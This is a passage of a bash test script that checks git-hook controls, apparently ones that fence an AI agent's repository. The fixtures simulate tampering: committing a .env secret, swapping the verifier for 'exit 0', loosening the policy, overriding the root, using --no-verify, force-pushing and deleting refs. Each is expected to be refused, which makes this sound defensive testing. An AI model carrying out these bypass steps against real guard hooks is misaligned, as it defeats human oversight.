  routine_spaced_root="$routine_fixture_dir/spaced root & co"
  mkdir -p "$routine_spaced_root/tools"
  cp -p "$routine_work/tools/run-routine.sh" "$routine_spaced_root/tools/run-routine.sh"
  schedule_output="$(env "${routine_env[@]}" HOME="$routine_schedule_home" \
    PATH="$routine_mock_bin:$PATH" AGENT_ROUTINE_SCHEDULER_OS=Linux \
    AGENT_DIRECTORY_ROOT="$routine_spaced_root" \
    bash "$routine_work/tools/manage-routine-schedule.sh" --routine maintenance \
    --scheduler auto --at 03:00 --print)"
  printf '%s\n' "$schedule_output" | grep -Fq "cd '$routine_spaced_root'" || \
    fail 'scheduler fixture: the cron render does not quote a path with spaces'
  schedule_output="$(env "${routine_env[@]}" HOME="$routine_schedule_home" \
    PATH="$routine_mock_bin:$PATH" AGENT_ROUTINE_SCHEDULER_OS=Darwin \
    AGENT_DIRECTORY_ROOT="$routine_spaced_root" \
    bash "$routine_work/tools/manage-routine-schedule.sh" --routine maintenance \
    --scheduler auto --at 03:00 --print)"
  printf '%s\n' "$schedule_output" | grep -Fq 'spaced root &amp; co' || \
    fail 'scheduler fixture: the plist render does not XML-escape an ampersand in the path'

  # The whole fixture must not have touched the real repo or the real OS schedule.
  if [[ -n "$real_head_before_routine_fixture" ]]; then
    [[ "$(git -C "$repo_root" rev-parse HEAD)" == "$real_head_before_routine_fixture" ]] || \
      fail 'routine fixture: the real repository HEAD changed during the fixture run'
  fi
fi

# Control boundary fixtures: the verifier, the policy, the installer, and both git hooks are
# exercised inside isolated repositories. Nothing touches the real repo or its .git/hooks.
# Regression targets (audit 2026-08-07): unstaged policy/verifier tamper, root override,
# full-validation receipts, machine-blocked mixed scope, outgoing push re-check,
# Project contract tier, Independent-root enforcement, and stale-snapshot refresh.
if [[ "$full" == true && -z "${AGENT_VALIDATOR_NESTED_FIXTURE:-}" ]]; then
  control_fixture_dir="$(mktemp -d "${TMPDIR:-/tmp}/agent-validator-control.XXXXXX")"
  cleanup_paths+=("$control_fixture_dir")
  control_work="$control_fixture_dir/work"
  control_bare="$control_fixture_dir/bare.git"
  control_decoy="$control_fixture_dir/decoy"
  control_env=(
    HOME="$control_fixture_dir" GIT_CONFIG_NOSYSTEM=1
    GIT_AUTHOR_NAME=fixture GIT_AUTHOR_EMAIL=fixture@example.invalid
    GIT_COMMITTER_NAME=fixture GIT_COMMITTER_EMAIL=fixture@example.invalid
  )
  mkdir -p "$control_work/tools/hooks" "$control_work/knowledge/raw/internal" \
    "$control_work/knowledge/wiki/logs" "$control_work/projects/demo"
  cp "$repo_root/tools/check-boundary.sh" "$repo_root/tools/control-policy.tsv" \
    "$repo_root/tools/install-git-hooks.sh" "$control_work/tools/"
  cp "$repo_root/tools/hooks/pre-commit" "$repo_root/tools/hooks/pre-push" "$control_work/tools/hooks/"
  printf 'immutable record\n' > "$control_work/knowledge/raw/internal/record.txt"
  printf '# closed log\n' > "$control_work/knowledge/wiki/logs/2026-Q1.md"
  printf 'work\n' > "$control_work/projects/demo/note.md"
  printf '# demo contract\n' > "$control_work/projects/demo/PROJECT.md"
  env "${control_env[@]}" git -C "$control_work" init -q
  env "${control_env[@]}" git -C "$control_work" add -A
  env "${control_env[@]}" git -C "$control_work" commit -q -m 'fixture: control baseline'

  control_boundary() {
    # $@ = 追加の環境変数割り当て（例: AGENT_GUARDED_COMMIT=true）
    set +e
    control_output="$(cd "$control_work" && env "${control_env[@]}" "$@" \
      /bin/bash tools/check-boundary.sh --staged 2>&1)"
    control_status=$?
    set -e
  }
  control_commit() {
    # $1=commit message、以降=追加の環境変数割り当て。hooks経由の実commitを試みる。
    local control_message="$1"
    shift
    set +e
    control_output="$( (cd "$control_work" && env "${control_env[@]}" "$@" \
      git commit -q -m "$control_message") 2>&1 )"
    control_status=$?
    set -e
  }

  # A plain in-scope change passes the verifier.
  printf 'more work\n' >> "$control_work/projects/demo/note.md"
  env "${control_env[@]}" git -C "$control_work" add -A
  control_boundary
  if (( control_status != 0 )) || ! printf '%s\n' "$control_output" | grep -Fq 'BOUNDARY_OK'; then
    fail "control fixture: an in-scope staged change was not accepted: $control_output"
  fi
  env "${control_env[@]}" git -C "$control_work" commit -q -m 'fixture: in-scope work'

  # A forbidden path is refused even as an addition.
  printf 'SECRET=1\n' > "$control_work/.env"
  env "${control_env[@]}" git -C "$control_work" add -f .env
  control_boundary
  printf '%s\n' "$control_output" | grep -Fq 'reason=forbidden-path' || \
    fail "control fixture: staging .env was not refused as forbidden-path: $control_output"
  env "${control_env[@]}" git -C "$control_work" reset -q -- .env
  rm -f "$control_work/.env"

  # A frozen path accepts additions and refuses modification.
  printf 'tampered\n' >> "$control_work/knowledge/raw/internal/record.txt"
  env "${control_env[@]}" git -C "$control_work" add -A
  control_boundary
  printf '%s\n' "$control_output" | grep -Fq 'reason=frozen-path-modified' || \
    fail "control fixture: modifying immutable source material was not refused: $control_output"
  env "${control_env[@]}" git -C "$control_work" reset -q
  env "${control_env[@]}" git -C "$control_work" checkout -q -- knowledge/raw/internal/record.txt
  printf 'new record\n' > "$control_work/knowledge/raw/internal/record-2.txt"
  env "${control_env[@]}" git -C "$control_work" add -A
  control_boundary
  printf '%s\n' "$control_output" | grep -Fq 'BOUNDARY_OK' || \
    fail "control fixture: adding new immutable source material was refused: $control_output"
  env "${control_env[@]}" git -C "$control_work" commit -q -m 'fixture: add raw record'

  # Renaming a frozen file out of its area is a modification, not an addition.
  env "${control_env[@]}" git -C "$control_work" mv \
    knowledge/raw/internal/record-2.txt projects/demo/escaped.txt
  control_boundary
  printf '%s\n' "$control_output" | grep -Fq 'reason=frozen-path-modified' || \
    fail "control fixture: renaming a frozen file out of its area was not refused: $control_output"
  env "${control_env[@]}" git -C "$control_work" reset -q --hard >/dev/null

  # A guarded meta change requires the explicit one-commit acknowledgment (policy tamper included).
  printf '# fixture policy edit\n' >> "$control_work/tools/control-policy.tsv"
  env "${control_env[@]}" git -C "$control_work" add -A
  control_boundary
  printf '%s\n' "$control_output" | grep -Fq 'reason=guarded-path-without-ack' || \
    fail "control fixture: an unacknowledged policy edit was not refused: $control_output"
  control_boundary AGENT_GUARDED_COMMIT=true
  printf '%s\n' "$control_output" | grep -Fq 'BOUNDARY_OK' || \
    fail "control fixture: an acknowledged guarded change was refused: $control_output"

  # Guarded/contract changes mixed with ordinary work are machine-blocked even with the ack.
  printf 'mixed\n' >> "$control_work/projects/demo/note.md"
  env "${control_env[@]}" git -C "$control_work" add -A
  control_boundary AGENT_GUARDED_COMMIT=true
  printf '%s\n' "$control_output" | grep -Fq 'reason=mixed-scope' || \
    fail "control fixture: a mixed guarded+ordinary stage was not refused: $control_output"
  env "${control_env[@]}" git -C "$control_work" reset -q --hard >/dev/null

  # A Project contract change needs its own explicit approval acknowledgment.
  printf 'PC-01 rewritten\n' >> "$control_work/projects/demo/PROJECT.md"
  env "${control_env[@]}" git -C "$control_work" add -A
  control_boundary
  printf '%s\n' "$control_output" | grep -Fq 'reason=contract-path-without-approval' || \
    fail "control fixture: an unapproved Project contract change was not refused: $control_output"
  control_boundary AGENT_CONTRACT_COMMIT=true
  printf '%s\n' "$control_output" | grep -Fq 'BOUNDARY_OK' || \
    fail "control fixture: an approved Project contract change was refused: $control_output"
  env "${control_env[@]}" git -C "$control_work" reset -q --hard >/dev/null

  # The verifier refuses a transplanted root instead of judging the wrong repository.
  env "${control_env[@]}" git init -q "$control_decoy"
  printf 'SECRET=1\n' > "$control_work/.env"
  env "${control_env[@]}" git -C "$control_work" add -f .env
  set +e
  control_output="$(cd "$control_work" && env "${control_env[@]}" \
    AGENT_DIRECTORY_ROOT="$control_decoy" /bin/bash tools/check-boundary.sh --staged 2>&1)"
  control_status=$?
  set -e
  printf '%s\n' "$control_output" | grep -Fq 'reason=root-mismatch' || \
    fail "control fixture: a transplanted AGENT_DIRECTORY_ROOT was not refused: $control_output"

  # The installer is idempotent, snapshots the approved control files, and covers zero independents.
  control_hooks() {
    set +e
    control_output="$(cd "$control_work" && env "${control_env[@]}" \
      /bin/bash tools/install-git-hooks.sh "$@" 2>&1)"
    control_status=$?
    set -e
  }
  control_hooks --install
  printf '%s\n' "$control_output" | grep -Fq 'HOOKS_INSTALLED hooks=2 independent=0' || \
    fail "control fixture: hook install did not report two managed hooks: $control_output"
  control_hooks --install
  if (( control_status != 0 )); then
    fail "control fixture: a repeated hook install was not idempotent: $control_output"
  fi
  control_hooks --status
  printf '%s\n' "$control_output" | grep -Fq 'pre-commit=managed pre-push=managed independent=0/0' || \
    fail "control fixture: hook status does not report both hooks as managed: $control_output"
  for control_snapshot_file in check-boundary.sh control-policy.tsv approved.sha256; do
    [[ -f "$control_work/.git/agent-control/$control_snapshot_file" ]] || \
      fail "control fixture: install did not snapshot $control_snapshot_file"
  done

  # With hooks installed: loosening the working-tree policy WITHOUT staging it changes nothing —
  # the hook judges with the approved snapshot, so the forbidden path still cannot be committed.
  printf '# 全行無効化\n' > "$control_work/tools/control-policy.tsv"
  control_commit 'fixture: unstaged policy tamper'
  if (( control_status == 0 )) || ! printf '%s\n' "$control_output" | grep -Fq 'reason=forbidden-path'; then
    fail "control fixture: an unstaged policy loosening changed the verdict: $control_output"
  fi
  env "${control_env[@]}" git -C "$control_work" checkout -q -- tools/control-policy.tsv

  # Neutering the working-tree verifier without staging it is equally ineffective.
  printf '#!/bin/sh\nexit 0\n' > "$control_work/tools/check-boundary.sh"
  control_commit 'fixture: unstaged verifier tamper'
  if (( control_status == 0 )) || ! printf '%s\n' "$control_output" | grep -Fq 'reason=forbidden-path'; then
    fail "control fixture: an unstaged verifier replacement changed the verdict: $control_output"
  fi
  env "${control_env[@]}" git -C "$control_work" checkout -q -- tools/check-boundary.sh

  # The hook pins the root, so an external AGENT_DIRECTORY_ROOT cannot transplant the judgement.
  control_commit 'fixture: root override attempt' AGENT_DIRECTORY_ROOT="$control_decoy"
  if (( control_status == 0 )) || ! printf '%s\n' "$control_output" | grep -Fq 'reason=forbidden-path'; then
    fail "control fixture: AGENT_DIRECTORY_ROOT transplanted the hook judgement: $control_output"
  fi
  env "${control_env[@]}" git -C "$control_work" reset -q -- .env
  rm -f "$control_work/.env"

  # An unacknowledged guarded commit fails at the hook.
  printf 'forbidden\tblocked.txt\tfixture row\n' >> "$control_work/tools/control-policy.tsv"
  env "${control_env[@]}" git -C "$control_work" add tools/control-policy.tsv
  control_commit 'fixture: tamper attempt'
  if (( control_status == 0 )); then
    fail 'control fixture: the pre-commit hook let an unacknowledged guarded commit through'
  fi

  # The ack alone is not enough: a guarded commit needs the index-tree-bound full receipt.
  control_commit 'fixture: acked without receipt' AGENT_GUARDED_COMMIT=true
  if (( control_status == 0 )) || \
    ! printf '%s\n' "$control_output" | grep -Fq 'reason=missing-full-validation-receipt'; then
    fail "control fixture: a guarded commit passed without a full-validation receipt: $control_output"
  fi
  control_receipt_tree="$(env "${control_env[@]}" git -C "$control_work" write-tree)"
  mkdir -p "$control_work/.git/agent-control/receipts"
  printf 'head=fixture\n' > "$control_work/.git/agent-control/receipts/$control_receipt_tree"
  control_commit 'fixture: acknowledged policy change' AGENT_GUARDED_COMMIT=true
  if (( control_status != 0 )); then
    fail "control fixture: an acknowledged guarded commit with a receipt was refused: $control_output"
  fi
  [[ ! -f "$control_work/.git/agent-control/receipts/$control_receipt_tree" ]] || \
    fail 'control fixture: the full-validation receipt was not consumed on use'

  # The snapshot follows HEAD only: the newly committed forbidden row is enforced on the
  # next commit, and approved.sha256 records the refreshed policy blob.
  printf 'smuggle\n' > "$control_work/blocked.txt"
  env "${control_env[@]}" git -C "$control_work" add blocked.txt
  control_commit 'fixture: stale snapshot probe'
  if (( control_status == 0 )) || ! printf '%s\n' "$control_output" | grep -Fq 'reason=forbidden-path'; then
    fail "control fixture: a policy row committed to HEAD was not enforced after refresh: $control_output"
  fi
  control_policy_blob="$(env "${control_env[@]}" git -C "$control_work" rev-parse HEAD:tools/control-policy.tsv)"
  grep -Fq "$control_policy_blob control-policy.tsv" "$control_work/.git/agent-control/approved.sha256" || \
    fail 'control fixture: the snapshot hash record did not follow the committed policy'
  env "${control_env[@]}" git -C "$control_work" reset -q -- blocked.txt
  rm -f "$control_work/blocked.txt"

  # The pre-push hook allows fast-forward pushes and re-checks outgoing content.
  env "${control_env[@]}" git init -q --bare "$control_bare"
  env "${control_env[@]}" git -C "$control_work" remote add origin "$control_bare"
  if ! env "${control_env[@]}" git -C "$control_work" push -q origin HEAD:main >/dev/null 2>&1; then
    fail 'control fixture: the pre-push hook refused a plain fast-forward push'
  fi

  # A forbidden file committed with --no-verify is still stopped before it reaches the remote.
  printf 'SECRET=1\n' > "$control_work/.env"
  env "${control_env[@]}" git -C "$control_work" add -f .env
  env "${control_env[@]}" git -C "$control_work" commit -q --no-verify -m 'fixture: smuggled secret'
  set +e
  control_output="$(env "${control_env[@]}" git -C "$control_work" push origin HEAD:main 2>&1)"
  control_status=$?
  set -e
  if (( control_status == 0 )) || ! printf '%s\n' "$control_output" | grep -Fq 'reason=forbidden-path'; then
    fail "control fixture: the pre-push hook let a --no-verify forbidden commit through: $control_output"
  fi
  env "${control_env[@]}" git -C "$control_work" reset -q --hard HEAD~1 >/dev/null

  # Rewritten history is refused as non-fast-forward, and remote ref deletion is refused.
  env "${control_env[@]}" git -C "$control_work" reset -q --hard HEAD~1 >/dev/null
  printf 'diverged\n' >> "$control_work/projects/demo/note.md"
  env "${control_env[@]}" git -C "$control_work" add projects/demo/note.md
  control_commit 'fixture: diverged history'
  (( control_status == 0 )) || \
    fail "control fixture: a plain commit for the divergence probe was refused: $control_output"
  set +e
  control_output="$(env "${control_env[@]}" git -C "$control_work" push --force origin HEAD:main 2>&1)"
  control_status=$?
  set -e
  if (( control_status == 0 )) || ! printf '%s\n' "$control_output" | grep -Fq 'reason=non-fast-forward'; then
    fail "control fixture: the pre-push hook let a forced non-fast-forward push through: $control_output"
  fi
  set +e
  control_output="$(env "${control_env[@]}" git -C "$control_work" push origin :refs/heads/main 2>&1)"
  control_status=$?
  set -e
  if (( control_status == 0 )) || ! printf '%s\n' "$control_output" | grep -Fq 'reason=ref-deletion'; then
    fail "control fixture: the pre-push hook let a remote ref deletion through: $control_output"
  fi

  # A materialized Independent repository receives the same hooks with a normalized path prefix,
  # so its own contract file is protected inside its own Git root.
  control_ind="$control_work/projects/ind"
  mkdir -p "$control_ind"
  printf '# independent contract\n' > "$control_ind/PROJECT.md"
  printf 'independent work\n' > "$control_ind/note.md"
  env "${control_env[@]}" git -C "$control_ind" init -q
  env "${control_env[@]}" git -C "$control_ind" add -A
  env "${control_env[@]}" git -C "$control_ind" commit -q -m 'fixture: independent baseline'
  control_hooks --install
  printf '%s\n' "$control_output" | grep -Fq 'HOOKS_INSTALLED hooks=2 independent=1' || \
    fail "control fixture: install did not cover the materialized independent repository: $control_output"
  grep -Fqx 'projects/ind/' "$control_ind/.git/agent-control/path-prefix" || \
    fail 'control fixture: the independent snapshot does not carry its normalized path prefix'
  printf 'PC-01 rewritten\n' >> "$control_ind/PROJECT.md"
  env "${control_env[@]}" git -C "$control_ind" add PROJECT.md
  set +e
  control_output="$( (cd "$control_ind" && env "${control_env[@]}" \
    git commit -q -m 'fixture: independent contract tamper') 2>&1 )"
  control_status=$?
  set -e
  if (( control_status == 0 )) || \
    ! printf '%s\n' "$control_output" | grep -Fq 'reason=contract-path-without-approval'; then
    fail "control fixture: the independent contract change was not refused: $control_output"
  fi
  set +e
  control_output="$( (cd "$control_ind" && env "${control_env[@]}" AGENT_CONTRACT_COMMIT=true \
    git commit -q -m 'fixture: approved independent contract change') 2>&1 )"
  control_status=$?
  set -e
  if (( control_status != 0 )); then
    fail "control fixture: an approved independent contract change was refused: $control_output"
  fi

  # An unmanaged hook is never overwritten on install nor deleted on remove.
  printf '#!/bin/sh\nexit 0\n' > "$control_work/.git/hooks/pre-commit"
  control_hooks --install
  printf '%s\n' "$control_output" | grep -Fq 'reason=unmanaged-hook-exists' || \
    fail "control fixture: install overwrote an unmanaged hook: $control_output"
  control_hooks --remove
  printf '%s\n' "$control_output" | grep -Fq 'HOOKS_REMOVED removed=1 independent=1' || \
    fail "control fixture: remove did not report the managed hooks precisely: $control_output"
  [[ -f "$control_work/.git/hooks/pre-commit" ]] || \
    fail 'control fixture: remove deleted an unmanaged hook'
fi

run_git_boundary_checks
finish_run
